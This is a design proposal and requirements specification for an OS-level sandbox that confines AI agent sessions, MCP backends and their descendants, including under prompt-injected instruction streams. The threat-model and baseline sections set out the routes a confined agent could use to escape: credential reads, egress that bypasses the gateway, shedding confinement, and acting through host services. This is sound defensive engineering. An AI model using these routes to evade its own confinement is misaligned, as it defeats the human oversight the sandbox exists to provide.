# Formwork: an OS-level sandbox for agent sessions

Working name. Design proposal with end-to-end test specification.

Formwork is a sandboxing substrate for agent sessions. It turns the four capabilities that touch the real operating system — read, write, exec, net — into enforceable boundaries, on Linux and macOS, for an agent process and every child it spawns.

Formwork is standalone. It takes a capability blueprint and produces an enforced sandbox plus an honest report of what it could and could not enforce. A host — Claude Code, OpenCode, or a bare shell wrapper — depends on Formwork; Formwork depends on nothing above it. The name is the metaphor: formwork is the temporary mould that contains poured concrete until it cures — a frame that constrains where the material can go. That is a sandbox around a process tree.

## 1. Design philosophy: good isolation, maximal reuse

The central decision in this design is that Formwork targets **good isolation, not perfect isolation** — a scoping choice that drives most of the requirements below.

The goal is a boundary that reliably contains an agent — and code the agent runs, and MCP servers it fronts — from casually or accidentally reading, writing, or exfiltrating things outside its lane, including when the agent is driven by a prompt-injected or otherwise adversarial instruction stream. The goal is *not* to withstand an adversary writing kernel exploits against Landlock or Seatbelt. Formwork raises the bar a great deal and fails closed on egress; it does not claim to be an airtight security boundary against local privilege escalation or a kernel zero-day. Section 3 states this threat model precisely, and every enforcement claim in this document is scoped to it.

The second half of the philosophy is **transparency and reuse**. Formwork is not a minimal-from-empty jail that the agent must have a bespoke image built for. It starts from the real, ambient environment — the host's interpreters, toolchains, shared libraries, and language package caches — and *subtracts* a sensitive set (credentials, keys, other projects, browser profiles). The confined agent should be able to run `pytest`, `npm test`, `git`, and a normal build against the environment that is already there, with zero denials in the common case. Isolation the agent constantly trips over is isolation that gets turned off. Formwork earns its keep by being nearly invisible to well-behaved work while remaining a hard wall around the sensitive set and all network egress.

These two halves are in tension, and the resolution is the third principle: **honesty**. Formwork always reports what it enforces on the current platform and kernel, and never silently claims containment it cannot deliver. A caller that needs a stronger guarantee than the current host can provide learns that from the fidelity report rather than discovering it in an incident.

## 2. Architecture overview

Formwork has three enforcement arms driven by a single capability compiler. The **launcher** runs first — the pre-spawn arm that constructs the confined child's environment, strips catalog credentials (variable absent, not denied), and write-protects its own policy inputs before control transfers. Then the **confiner** (the hard OS boundary) and the **gateway** (the soft boundary: MCP shading and, under host rules, egress) hold for the lifetime of the session.

```
┌───────────────────────────────────────────────────────────────────────┐
│  CAPABILITY BLUEPRINT (unveil-style; layered file+CLI surfaces)       │
│  read(path) · write(path) · [exec(path)] · net-posture · env ·        │
│  host rules · allow-credentials · channels · isolate ·                │
│  mcp(server → visibility)                                             │
├───────────────────────────────────────────────────────────────────────┤
│  COMPILER (pure; no kernel calls; credential catalog is an input)     │
│  blueprint → { launcher, confiner, gateway } + FidelityReport         │
├───────────────────────┬─────────────────────┬─────────────────────────┤
│ LAUNCHER (pre-spawn)  │ CONFINER (hard)     │ GATEWAY (soft)          │
│ env construction &    │ Linux: Landlock     │ MCP-aware policy proxy  │
│ credential strip      │ + seccomp           │ shades tools/resources/ │
│ → var absent          │ + connect super-    │ prompts; fronts stdio + │
│ policy-input write-   │   visor             │ http/sse backends;      │
│ protect (FW-XR8)      │ macOS: Seatbelt     │ confines its backends;  │
│ proxy + CA variables, │ fs r/w, net-deny,   │ egress engine: host     │
│ brokered placeholders │ channel baseline,   │ rules, TLS inspection,  │
│                       │ descendant inherit  │ credential brokering    │
└───────────────────────┴──────────┬──────────┴────────────┬────────────┘
                                   │ confines              │ stdio (MCP); supervised
                                   ▼                       │ connect or loopback
                           ┌───────────────┐               │ listener (egress)
                           │  AGENT        │◄──────────────┘
                           │  (confined)   │
                           └───────────────┘
                                   ▲
                                   │ confines (recursion)
                           ┌───────────────┐
                           │ stdio MCP     │  spawned by gateway, itself
                           │ backend       │  confined by the same confiner
                           └───────────────┘
```

Five things make this hang together:

**The launcher is where non-kernel capabilities are applied.** Landlock and Seatbelt cannot shade an environment variable — it is a string in the process's environment block, not a filesystem object. But Formwork *spawns* the confined process, so it constructs the child's environment: shading a variable is simply not copying it into the spawn. The child comes up having never had it — stronger, in kind, than a path denial (a denied path still announces a wall; a stripped variable is indistinguishable from never-configured, [FW-INV9](#fw-inv9)). The one contingency: it holds only while Formwork is the launching process, which the report must disclose ([FW-CRED8](#fw-cred8)).

**The confiner makes the gateway unavoidable.** Because the confined agent has no network of its own and no filesystem beyond its grant, every MCP interaction and every byte of egress is *forced* through the gateway. That is what upgrades tool-shading from a suggestion into a control: there is no other door.

**The transport never rests on the filesystem sandbox allowing a socket path.** MCP traffic runs over the stdio of the `formwork gateway` process the MCP host launches, an inherited descriptor that behaves identically on both platforms. Under host rules the confined process's own `connect()` is the request: on Linux a seccomp supervisor outside the sandbox receives it, performs any allowed connect itself, and installs the result ([FW-EGR7](#fw-egr7)); on macOS the profile reaches only the session gateway's loopback listener, which admits a connection only from the session ([FW-EGR8](#fw-egr8), [FW-EGR9](#fw-egr9)). Formwork never relies on the filesystem sandbox to selectively *allow* a socket path — a mechanism that is coarse and bleeding-edge on Linux (section 9). The original design's injected-fd seam, with connections pre-opened at spawn or minted over `SCM_RIGHTS`, was built and verified, then retired unwired once FEP-5 carried egress this way.

**The gateway is also the egress engine.** Under host rules every byte of egress leaves through the gateway's in-process HTTP(S) proxy (FEP-6). It checks each destination against the host rules and the destination classes, terminates TLS for inspected hosts with a per-session, name-constrained CA so it can check each request's method and path, and presents brokered credentials the confined process never holds ([FW-EGR10](#fw-egr10), [FW-EGR25](#fw-egr25), [FW-CRED11](#fw-cred11), [FW-INV13](#fw-inv13)).

**One privileged broker, everything else in a mould.** The gateway is the only process holding host network and broad filesystem access. The agent and every stdio MCP backend the gateway spawns are confined by the same confiner. The trust boundary is a single, small, auditable component.

Naming note (open, section 11): this document uses **Formwork** for the whole system, **confiner** for the hard OS layer, and **gateway** for the soft MCP layer. There is an argument that the name Formwork should be reserved for the confiner alone, since the mould metaphor is about containment. Left as an open decision.

## 3. Threat model

**In scope — Formwork is a boundary against these:**

- A confined process (the agent, code it runs, or an MCP backend) reading files outside its granted read scope, including the sensitive set (credentials, SSH/cloud config, keychains, other projects, browser profiles).
- A confined process writing outside its granted write scope.
- A confined process making network egress by any means other than through the gateway — direct `connect()`, raw sockets, direct DNS, ignoring proxy environment variables.
- A confined process reaching processes outside its domain via abstract or pathname UNIX sockets, or via signals, where the platform supports scoping.
- The agent invoking or even discovering MCP tools, resources, or prompts that policy does not grant.
- A descendant process shedding or widening the confinement it inherited.
- A confined process causing a process outside its session to act on its behalf — execute a command, open a URL, perform egress, or disclose a secret — through a host service (AppleEvents, LaunchServices, launchd, the session bus, display-server sockets). *(Added by FEP-5; the channel baseline, [FW-ISO13](#fw-iso13).)*
- Prompt-injected instruction streams driving any of the above: the boundary is enforced by the OS and the gateway, not by the model's cooperation.

**Out of scope — Formwork does not claim to defend against these:**

- Kernel or LSM exploitation (a Landlock/Seatbelt bypass, a kernel zero-day). Formwork's guarantees are only as strong as the underlying mechanism.
- Covert channels and side channels (timing, cache, resource-contention inference).
- Resource-exhaustion denial of service as a *security* property. Formwork may set cgroup/rlimit bounds for stability, but does not claim them as an airtight control.
- Confining inference, GPUs, or the model itself.
- Hostile multi-tenant co-tenancy at cloud scale. Formwork is a personal/team substrate, not a hosted platform isolating mutually adversarial tenants.
- Credential *content* scanning. Credential coverage is location-based only — the typed catalog plus a generic backstop (FEP-2 FW-CRED); Formwork never inspects bytes to decide what is secret.
- Perfect unveil-style invisibility of the filesystem. Formwork accepts EACCES-style denial (section 4); it does not emulate ENOENT for every ungranted path.

## 4. The capability blueprint and its interpreter

Formwork consumes a finite, enumerable **Blueprint** — the unveil/pledge lineage, narrowed to what an OS sandbox can carry. (The name fits the construction metaphor: formwork is the mould; the Blueprint is the plan the mould is built from. It is defined once, here, and used for nothing else.)

```
extends: [blueprint]          # base Blueprints/presets this one layers over (FW-BP3)
read(path-pattern)            # filesystem read
write(path-pattern)           # filesystem write + create (implies read of the same)
write-no-create(path-pattern) # write existing files but NOT create new ones — the split (FW-CAP9)
subtract(path-pattern)        # carve a sensitive hole out of the read+write grant (deny wins)
write-subtract(path-pattern)  # write-deny but keep readable: tamper vectors (FW-TRA7)
exec(path-pattern)            # OPTIONAL: execute only these binaries (off by default)
net: Deny                     # default: no direct egress at all
   | Ports([u16])             # optional: allow direct TCP connect to these ports
   | AllowHosts(host rules)   # egress only through the gateway, to named hosts (FW-EGR1)
rules: ["<atoms>:<target>"]   # flat verb rules: a path target is fs, a host target egress (FW-BP6, FW-BP13)
env: Passthrough              # default: inherit the launcher's environment
   | Allowlist([name])        # only the named vars survive
   | Scrub({allow, deny})     # drop secret-shaped vars by name/value, minus an allowlist (FW-ENV1/2)
allow-credentials: [type      # lift a credential-catalog type — the ONLY un-deny (FW-CRED5)
   | broker:type              # keep the floor; the gateway presents it (FW-CRED11)
   | {name, env, hosts, scheme}]  # broker a credential the catalog does not know (FW-BP12)
channels: "deny" | {allow, deny}  # host services lifted for the session (FW-BP9)
isolate: [processes, ipc]     # opt-in process and IPC isolation (FW-ISO10)
discovery.auto-widen: [path]  # zone in which a learning run may self-grant (FW-DISC4)
mcp(server): {                # per-MCP-server visibility policy
    tools:     Allow([...]) | AllowAll | Deny,
    resources: Allow([...]) | AllowAll | Deny,
    prompts:   Allow([...]) | AllowAll | Deny,
    sampling:  Allow | Deny,     # server→client sampling requests
    elicitation: Allow | Deny,   # server→client elicitation requests
}
```

The compiler is the single authority that maps this blueprint to concrete mechanisms. It is pure — it never touches the kernel — so it runs in CI on any box, lets a Linux policy be compiled and inspected on a Mac, and is deterministic. It takes the credential catalog (§5.9) as an explicit input — the floor cannot be forgotten, only resolved — and emits the launcher, confiner, and gateway policies plus a `FidelityReport`.

The Blueprint is a typed, versioned schema with **multiple surfaces onto one model** ([FW-BP1](#fw-bp1)): the TOML file is one serialization; the CLI flags are another, applied as an override layer. It is deliberately a standard serialization, not a bespoke DSL — a Blueprint is data with no control flow, and a policy language would pay SELinux's legibility cost to describe a struct. If real logic is ever required, the answer is an existing configuration language, never a new one.

A third way to write the same grants (FEP-3): flat **verb** rules (`"<verb>:<path>"`, e.g. `deny:~/.ssh`) and a `mode` posture ([FW-BP6](#fw-bp6)/[FW-BP7](#fw-bp7)), evaluated **hide → allow → deny-terminal** ([FW-CAP8](#fw-cap8)). Verbs desugar into the fields above at the CLI edge — `read`/`readwrite`/`modify`/`allow`/`readexec`/`exec`/`deny`, where `modify` is the write-without-create grade of the create/write split ([FW-CAP9](#fw-cap9)) — and `mode` (`unveil`/`subtractive`) aliases `[fs] read-mode`.

Two semantics choices, both settled earlier in design:

- **EACCES denial is acceptable; invisibility is preferred only where free.** Filesystem denials surface as the platform's natural errno (EACCES on Landlock, EPERM/EACCES on Seatbelt). Formwork does not build a mount-namespace or FUSE layer to fake ENOENT. The one place invisibility *is* cheap and *is* required is MCP tool/resource/prompt shading at the gateway, where an ungranted item is simply absent from the listing. For the sensitive *subset*, metadata is also denied where a backend supports it (Seatbelt `file-read-metadata`), so a credential's existence, size, and mtime do not leak through `stat` ([FW-CAP7](#fw-cap7)); where a backend cannot (Landlock), that residual is reported Partial rather than left as a blanket concession.
- **The default profile is subtractive, not minimal.** Rather than granting an empty world and adding paths, the default profile grants broad read over the ambient environment (system prefixes, interpreters, shared libraries, standard tool locations, language caches) and subtracts a configured sensitive set. This is the reuse principle expressed as policy.

Five further points pin the vocabulary above down so it is unambiguous to the compiler and gateway:

- **MCP item identity.** Shading matches items by their natural MCP identifier: tools and prompts by `name`, resources by `uri`, and resource templates by `uriTemplate`. A `resources` allow list therefore contains URIs (for concrete resources, matched on `resources/list` and `resources/read`) and/or URI templates (for `resources/templates/list`); tool and prompt lists contain names. An item that lacks its identifier field is treated as ungranted (fail-closed). This is what keeps the resource axis consistent across list, read, and templates rather than silently matching one of them on a different key.
- **MCP identifiers match exactly or by anchored pattern, with a terminal deny ([FW-GW9](#fw-gw9)).** Each axis is an **allow** scope minus a terminal **deny** list. A list entry is either an exact identifier or an anchored regex written `/…/` — compiled as `\A(?:…)\z`, so it matches the whole identifier (`/get_.*/` covers `get_issue`, not the substring hit `forget_me`). `permits(id)` holds iff the allow scope admits `id` and no deny pattern matches it, so a deny always wins over any allow — the same deny-terminal bias as the fs model ([FW-CAP8](#fw-cap8)), here over protocol names rather than paths. Authoring is one shape on every axis: the keyword `"allow-all"`/`"deny"`, `{ allow = [...] }`, `{ allow = [...], deny = [...] }`, or a deny-only `{ deny = [...] }` (omitting `allow` means "all", an explicit `allow = []` means "none", and an empty `{}` is a loud error). Unlike the fs axis this is a *userspace* string match in the privileged gateway, not a kernel path rule, so a general regex here is sound where a general fs glob is not ([FW-BP4](#fw-bp4)): a mismatch shades one protocol frame, never silently unroots a kernel deny. A `/…/` that will not compile fails loud at parse ([FW-INV6](#fw-inv6)).
- **Grant paths must be representable.** Grant, write, and `subtract` paths are canonicalized against the real filesystem at enforce time (symlink and firmlink resolution) so kernel path-matching lines up. A resolved path that cannot be faithfully rendered into the backend's policy language — e.g. a non-UTF-8 byte path — makes enforcement **fail loud**, never emit a lossy rule that might silently not match. A `subtract` hole that failed to match would be a silent fail-open of the sensitive set, which [FW-INV6](#fw-inv6) forbids. Patterns are absolute, an any-depth basename form (`**/.env`) that matches a trailing component at any depth, or the prefix-anchored refinement (`<prefix>/**/<suffix>`) that matches only below an absolute prefix ([FW-CAP6](#fw-cap6)); no `..` traversal exists, and all forms canonicalize deterministically ([FW-FID4](#fw-fid4)).
- **Path sigils are a closed set, expanded at the CLI edge.** `~` → `$HOME` and `$CWD` → the launch directory, expanded *before* patterns reach the compiler, so a grant can be written relative to the project it runs in ([FW-BP5](#fw-bp5)). Fixed tokens only — never general `$VAR` interpolation, since the environment is exactly what the launcher strips ([FW-CRED2](#fw-cred2)). An unresolvable sigil fails loud, never silently widening ([FW-INV6](#fw-inv6)).
- **Layers merge in a fixed order, and deny beats allow.** Baseline (the fail-closed empty Blueprint plus the credential-catalog floor) → `extends` chain (depth-first, bases before deriveds) → the file → CLI overrides ([FW-BP2](#fw-bp2)). Postures are last-set-wins; path sets merge additively; at any layer and any precedence, deny/subtract wins over allow — the only un-deny anywhere is the typed credential exclude ([FW-BP4](#fw-bp4), [FW-CRED5](#fw-cred5)).
- **Environment is a capability, applied at spawn.** The `env` posture ([FW-ENV1](#fw-env1)) governs what environment the confined child receives — passthrough, an allowlist of names, or a scrub of secret-shaped vars. The launcher, not the confiner, builds the child's environment: the credential-catalog strip partitions first ([FW-CRED4](#fw-cred4)), then the posture filters what remains; the `FidelityReport` carries the verdict like any other capability. The default profile's scrub ([FW-ENV2](#fw-env2)) is heuristic, so it is reported Partial, never a silent over-claim.

FEP-5 and FEP-6 add egress, host services, and isolation to the vocabulary. Four points pin them down:

- **Host rules are verb rules with a host target, and each host has one grade.** A rule target that does not begin with `/`, `~`, `$` or `**` is a host target, `host[:port][/glob]`, whose host contains a dot, is `localhost`, or is an IP literal ([FW-BP16](#fw-bp16)). `*.example.com` matches one or more labels under the apex but not the apex; the port defaults to 443; the glob matches the canonical path without its query. `allow:` and the HTTP method atoms (`get`, `post`, `put`, `patch`, `delete`, `head`, `options`) are the **inspected** grade: the gateway terminates TLS and admits each request by `Host`, method and canonical path ([FW-EGR10](#fw-egr10), [FW-EGR11](#fw-egr11)). `tunnel:` is the **tunnel** grade: the connection is forwarded once the ClientHello's server name matches the CONNECT host, and the request inside is opaque ([FW-EGR16](#fw-egr16), [FW-EGR5](#fw-egr5)). `deny:` is terminal. A tunnel rule and an inspected rule for one host and port, or a path `deny` on a tunnel host, are a compile error ([FW-BP14](#fw-bp14)); any host rule sets the net posture to `AllowHosts`, which excludes the port tier ([FW-BP13](#fw-bp13)).
- **Destinations are classified, not only named.** The gateway resolves a host once and classifies every address it gets back: metadata, the gateway's own endpoints, the host's own addresses, local and private, special-purpose, or global (the table is FEP-6 §4.5). A wildcard rule reaches global addresses only; an exact name also reaches local, private and host addresses; metadata and special-purpose addresses need an IP-literal rule; the gateway's own endpoints are never admitted ([FW-EGR4](#fw-egr4), [FW-EGR17](#fw-egr17)–[FW-EGR19](#fw-egr19)).
- **A brokered credential stays outside the sandbox.** `broker:<type>` keeps the type's floor ([FW-CRED10](#fw-cred10)); the confined process sees a per-session placeholder in the type's variable, and the gateway presents the real value only on the bound hosts, over TLS, guarded against reflection ([FW-CRED11](#fw-cred11), [FW-CRED17](#fw-cred17)–[FW-CRED19](#fw-cred19), [FW-INV13](#fw-inv13)).
- **Host services are channels, closed by default.** A channel is a host service that can act outside the sandbox on a confined process's behalf: `run-outside`, `open-url`, `clipboard`, `screen`, `camera` and `microphone`, with the groups `desktop` (`clipboard`, `open-url`) and `media` (`screen`, `camera`, `microphone`). Every blueprint denies them unless `channels` lifts one ([FW-ISO13](#fw-iso13), [FW-BP9](#fw-bp9)); `open-url` is brokered through a Formwork opener shim, so lifting it opens no host service ([FW-ISO17](#fw-iso17)). `isolate` adds process and IPC isolation on request ([FW-ISO10](#fw-iso10)).

## 5. Requirements

Every requirement, invariant, and end-to-end test in this document carries a stable identifier: `FW-<FAMILY><n>` for requirements (families: XR, CAP, ISO, GW, TRA, FID, ENV, BP, CRED, DISC, EGR), `FW-INV<n>` for invariants (§6), and `FW-E2E-<nnn>` / `FW-ADV-<nnn>` for tests (§7). An ID is minted once, in the document that defines it, and is never renumbered or reused; enhancement proposals continue the sequences and reserve blocks at adoption. Each definition carries an HTML anchor named for the lowercase ID, so any document can cite a requirement as a link — `[FW-CAP2](formwork.md#fw-cap2)` — and code cites the bare, greppable ID. The full convention is doctrine (`constitution.md`, Requirements & identifiers) and CI-checked (`py/harness/test_requirements.py`).

### 5.1 Cross-cutting requirements

| Req | Requirement |
|---|---|
| <a id="fw-xr1"></a>**FW-XR1** Fidelity honesty | Every enforcement Formwork claims is backed by a mechanism on the current host, or is reported as Partial/Unenforceable. `enforce()` never silently downgrades a claim made by `compile()`. |
| <a id="fw-xr2"></a>**FW-XR2** Good-not-perfect boundary | Formwork is a containment boundary against accidental, careless, and prompt-injected overreach and against untrusted code the agent runs — not against kernel/LSM exploitation. Every guarantee in this document is scoped to section 3. |
| <a id="fw-xr3"></a>**FW-XR3** Fail-closed egress | Absent a working confiner, network defaults to full deny. The agent reaches the world only through the gateway. No configuration and no capability-detection failure produces silent open egress. |
| <a id="fw-xr4"></a>**FW-XR4** Descendant inheritance | Confinement applies to the confined process and every descendant. A child cannot shed, relax, or widen it. |
| <a id="fw-xr5"></a>**FW-XR5** Single privileged broker | Exactly one component (the gateway) holds host network and broad filesystem access. The agent and all stdio MCP backends are confined by the same confiner. |
| <a id="fw-xr6"></a>**FW-XR6** Behavioral parity | An identical blueprint yields equivalent observable behavior for the enforceable intersection across Linux and macOS. Platform divergence appears only in the FidelityReport, never as a silent behavior change. |
| <a id="fw-xr7"></a>**FW-XR7** Mediated transport | The agent reaches the gateway via an inherited descriptor (the MCP gateway's stdio), via a `connect()` it issues that the gateway performs on its behalf and installs ([FW-EGR7](#fw-egr7)), or, on macOS, via a `connect()` to the session's authenticated loopback listener ([FW-EGR8](#fw-egr8), [FW-EGR9](#fw-egr9)). Formwork never depends on the filesystem sandbox selectively *allowing* a socket path. *(Amended by FEP-5, and again when the injected-fd seam was retired: the macOS listener takes a `connect()` the confined process completes, which the earlier text excluded.)* |
| <a id="fw-xr8"></a>**FW-XR8** No agent-influenced escalation | No mechanism lets a confined process — or its instruction stream — disable, weaken, retry-outside, or reconfigure its own confinement. The policy is compiled and installed *before* the process runs ([FW-CAP2](#fw-cap2): narrowing only; widening does not exist). Any escalation a host chooses to offer is an out-of-band action on an unconfined process, never a signal the confined process can emit. |
| <a id="fw-xr9"></a>**FW-XR9** Surface fail-fast | A subcommand that cannot deliver its promise on the current host fails *before* consuming the user's work (their run, their time), naming the missing mechanism and the nearest alternative. The command-surface sibling of [FW-INV5](#fw-inv5)/[FW-INV6](#fw-inv6): enforcement honesty reports a wall it cannot install, and this refuses up front a *feature* it cannot deliver here — running an entire workload and only then announcing the command was impossible is a silent overpromise even when every byte was logged. [FW-E2E-062](#fw-e2e-062) pins the `learn` instance; the rule governs every future observe/probe/stream surface. |
| <a id="fw-xr10"></a>**FW-XR10** Wrapper transparency | Wrapper subcommands shall exit with the workload's status and write nothing of their own to stdout. |
| <a id="fw-xr11"></a>**FW-XR11** Failure attribution | A Formwork failure after the workload is spawned shall exit `125` and emit one `formwork:`-prefixed line on stderr attributing the failure to Formwork. |

### 5.2 Capability model (FW-CAP)

| Req | Requirement |
|---|---|
| <a id="fw-cap1"></a>**FW-CAP1** Enumerable vocabulary | The blueprint is a finite enumeration of read/write/subtract/exec/net/env/mcp — the fs write grade admits a create/write split ([FW-CAP9](#fw-cap9)). No mechanism accepts natural language and produces a grant. It is authored as typed fields or, equivalently, as flat verb rules ([FW-BP6](#fw-bp6)). |
| <a id="fw-cap2"></a>**FW-CAP2** Monotonic narrowing | A session may narrow its own grant but never widen it. A child's grant is a subset of its parent's. |
| <a id="fw-cap3"></a>**FW-CAP3** Subtractive default profile | The default profile is broad-read over the ambient environment minus a configured sensitive set, not minimal-from-empty. *(Realized concretely by FEP-2's compiled-in credential catalog + backstop, applied as a floor under every blueprint — [FW-CRED4](#fw-cred4).)* |
| <a id="fw-cap4"></a>**FW-CAP4** Invisibility for MCP, denial for fs | Ungranted MCP tools/resources/prompts are absent from listings and non-invocable. Ungranted filesystem paths may return EACCES rather than ENOENT. |
| <a id="fw-cap5"></a>**FW-CAP5** Single inspectable interpreter | The compiler is the sole blueprint→mechanism authority, and its output (compiled policy + report) is inspectable without enforcing. |
| <a id="fw-cap6"></a>**FW-CAP6** Anchored & basename patterns | Beyond absolute paths, the pattern vocabulary admits an any-depth basename form (`**/.env`) that matches a trailing component at any depth within a grant, and (FEP-2) its prefix-anchored refinement `<prefix>/**/<suffix>` that matches only below an absolute prefix. All forms canonicalize deterministically ([FW-FID4](#fw-fid4)) and stay fail-loud on non-representable resolution; no relative `..` traversal is introduced. |
| <a id="fw-cap7"></a>**FW-CAP7** Metadata denial for the sensitive set | Where the backend can express it (Seatbelt denies `file-read-metadata` per path), subtracted sensitive paths are denied at the metadata layer too, so existence/size/mtime of credentials do not leak via `stat`. Where it cannot (Linux/Landlock), the residual is reported Partial — narrowing the §3 EACCES-not-ENOENT concession specifically for credentials. |
| <a id="fw-cap8"></a>**FW-CAP8** Three-layer evaluation, deny-terminal | Path access resolves in a fixed order: (1) **hide** — unlisted paths are inaccessible (EACCES-shaped, not ENOENT; the report says so, [FW-CAP4](#fw-cap4)); (2) **allow** — grants punch holes, more specific wins within the layer; (3) **deny** — applied last and terminal. No allow at any layer, and no rule order, overrides a deny. The only removal of a deny is the typed credential exclude ([FW-CRED5](#fw-cred5)), which deletes the deny entry rather than overriding it. The structural form of [FW-BP4](#fw-bp4)/[FW-INV8](#fw-inv8). *(Added by FEP-3.)* |
| <a id="fw-cap9"></a>**FW-CAP9** Verb grammar & create/write split | The fs grant vocabulary is a closed verb set — `read`/`readonly`, `readwrite`, `modify`, `allow`, `readexec`, `exec`, `deny`. `modify` grants read + modify-existing but not create; `allow`/`readwrite` additionally grant create. The weaker grade is a distinct word (`modify`, not a bare `write`) so it never reads as full write — everything named "write" (the `writes` field, the `--write` flag, `readwrite`) grants create. Enforced on both backends: Landlock drops the `Make*` rights, Seatbelt allows every `file-write-*` op except `file-write-create`. *(Added by FEP-3; the `modify`/`writes-no-create` axis is the create/write split of [FW-CAP1](#fw-cap1).)* |

### 5.3 OS isolation / confiner (FW-ISO)

| Req | Requirement |
|---|---|
| <a id="fw-iso1"></a>**FW-ISO1** Read confinement | Enforce filesystem read scope (Landlock FS access rights / Seatbelt `file-read*`). |
| <a id="fw-iso2"></a>**FW-ISO2** Write confinement | Enforce filesystem write scope; write to a read-only-granted path is denied. |
| <a id="fw-iso3"></a>**FW-ISO3** Net default-deny | Deny all direct network egress by default (seccomp inet-socket deny / Seatbelt `network*` deny); the gateway is the only way out. |
| <a id="fw-iso4"></a>**FW-ISO4** Optional exec restriction | When set, restrict execution to an allowlist (Landlock `FS_EXECUTE` on paths / seccomp on `execve` / Seatbelt `process-exec*`). Off by default (transparency). |
| <a id="fw-iso5"></a>**FW-ISO5** Optional port tier | When requested, allow direct TCP connect to an explicit port set (Landlock net ABI v4+); report Unenforceable on older kernels. |
| <a id="fw-iso6"></a>**FW-ISO6** Two postures | Support spawn-confined (launcher confines a child; preferred) and confine-self (process restricts itself; pledge-style). |
| <a id="fw-iso7"></a>**FW-ISO7** Capability detection | Detect Landlock ABI / seccomp / Seatbelt availability at runtime and degrade with a report; never crash and never silently no-op. |
| <a id="fw-iso8"></a>**FW-ISO8** Anti-shedding baseline | Install a baseline that blocks confinement-shedding and privilege-escalation paths and the host-service channels through which a process outside the session could act on the confined process's behalf ([FW-ISO13](#fw-iso13), [FW-ISO14](#fw-iso14)): on Linux `NO_NEW_PRIVS` and a seccomp deny-list; on macOS the named SBPL denies. The baseline stays permissive enough that common toolchains run unmodified ([FW-TRA2](#fw-tra2)). *(Amended by FEP-5.)* |
| <a id="fw-iso9"></a>**FW-ISO9** Exec as a verb | Execution is expressed as the `exec`/`readexec` verb rather than a separate posture; off by default (no verb grants execute ⇒ execute is ungoverned/transparent). Reframes [FW-ISO4](#fw-iso4); the internal exec posture is unchanged (verbs desugar onto it). No traversal token — a covering-directory grant applies. The exec grant confers execute only, not read, on both backends ([FW-XR6](#fw-xr6) parity). *(Added by FEP-3.)* |
| <a id="fw-iso10"></a>**FW-ISO10** Isolation tier | When a blueprint requests `isolate`, the Confiner shall apply each member (`processes`, `ipc`) with the FEP-5 §3.3 mechanism for the platform. |
| <a id="fw-iso11"></a>**FW-ISO11** Datagram and raw closure (Linux) | Under every net posture, the Confiner shall deny AF_INET and AF_INET6 `SOCK_DGRAM` and `SOCK_RAW` socket creation (PR #29 for `Deny` and `Ports`; extended here to the host-allowlist posture). |
| <a id="fw-iso12"></a>**FW-ISO12** Pathname socket mediation (Linux) | Under supervised connect, the supervisor shall refuse a `connect()` or addressed send to a pathname AF_UNIX socket unless the socket is granted by `allow` or was bound by a process in the session. |
| <a id="fw-iso13"></a>**FW-ISO13** Channel baseline | In every blueprint, the Confiner shall deny each channel in the shipped baseline set that is not lifted by `channels` or by a typed credential exclusion, using the mechanism listed for its platform. |
| <a id="fw-iso14"></a>**FW-ISO14** Privileged-interface baseline (macOS) | The macOS profile shall deny `mach-priv-host-port`, `mach-priv-task-port`, and `iokit-open` outside the shipped IOKit allowlist. |
| <a id="fw-iso16"></a>**FW-ISO16** Process-environment disclosure | The Confiner shall deny a confined process reading the environment of any process outside the session where the platform provides a mechanism (Linux: Landlock's ptrace-class refusal, or the PID namespace under `isolate`; macOS provides none, characterization C5). *(Amended at reintegration to the characterized answer.)* |
| <a id="fw-iso17"></a>**FW-ISO17** Opener shim | In every spawned session, the Launcher shall place a Formwork-owned opener first in `PATH` and in `BROWSER`; it hands each URL to the Gateway, which opens it only when `open-url` is lifted and otherwise records a refusal. |
| <a id="fw-iso18"></a>**FW-ISO18** Brokered URL open | The Gateway shall accept from the opener shim `http` and `https` URLs only, record each on the operator channel, and open it with the host opener outside the session. |

`FW-ISO15` was drafted and retired before FEP-5 landed; the number stays retired.

### 5.4 Gateway / MCP (FW-GW)

| Req | Requirement |
|---|---|
| <a id="fw-gw1"></a>**FW-GW1** Transport-agnostic backends | Front stdio and http/sse/streamable-http MCP servers uniformly behind one agent-facing interface. |
| <a id="fw-gw2"></a>**FW-GW2** Tool shading | Ungranted tools are absent from `tools/list` and `tools/call` on a guessed name is refused. |
| <a id="fw-gw3"></a>**FW-GW3** Full-surface policy | Policy covers resources (list/read/templates), prompts (list/get), `list_changed` re-filtering, and server→client sampling/elicitation. |
| <a id="fw-gw4"></a>**FW-GW4** Single door | Shading is binding because the confiner removes every alternative path to the backend. |
| <a id="fw-gw5"></a>**FW-GW5** Backend confinement | stdio backends the gateway spawns are themselves confined by the confiner to their own grant. |
| <a id="fw-gw6"></a>**FW-GW6** fd minting | *(Retired with the injected-fd seam. It required the gateway to supply connection fds to the agent, pre-opened at spawn or minted on demand via `SCM_RIGHTS`; the seam was built and verified but never wired, since FEP-5 carries egress through the connect supervisor and the authenticated loopback listener and MCP runs over stdio. The number stays retired.)* |
| <a id="fw-gw7"></a>**FW-GW7** Least-privilege gateway | The gateway holds host network only to allowlisted MCP endpoints, and its own filesystem access is scoped to what brokering requires — its policy input and the stdio backends it spawns — not the host at large. |
| <a id="fw-gw8"></a>**FW-GW8** Transparent passthrough | For *granted* items, the gateway is protocol-transparent: no semantic mangling, so agents behave as if talking to the backend directly. |
| <a id="fw-gw9"></a>**FW-GW9** Pattern-matched shading | Each shaded axis (tools/prompts by `name`, resources/templates by `uri`/`uriTemplate`, [design §4](#fw-cap4)) carries an **allow** scope and a terminal **deny** list. Entries are exact identifiers or anchored regex written `/…/`, matched against the *whole* identifier (`\A(?:…)\z`), so an allow pattern cannot admit a substring nor a deny over-reach onto an unrelated name. `permits(name)` holds iff the allow scope admits it and no deny matches — deny is terminal, the MCP-surface form of the deny-terminal fs model ([FW-CAP8](#fw-cap8)/[FW-BP4](#fw-bp4)) applied to protocol identities. This is a *userspace* string match in the privileged gateway, never a kernel path boundary, so it does not reopen the "no general glob" fs doctrine ([FW-BP4](#fw-bp4)); the `regex` engine matches in guaranteed linear time, so a hostile blueprint pattern cannot wedge the gateway. A `/…/` that will not compile, and an ambiguous empty policy table, fail loud at parse ([FW-INV6](#fw-inv6)) rather than degrading to a silent deny-all or allow-all; pattern sets canonicalize deterministically ([FW-FID4](#fw-fid4)) and refusals stay oracle-free ([FW-ADV-004](#fw-adv-004)) since a deny-hidden name refuses exactly as a nonexistent one does. |

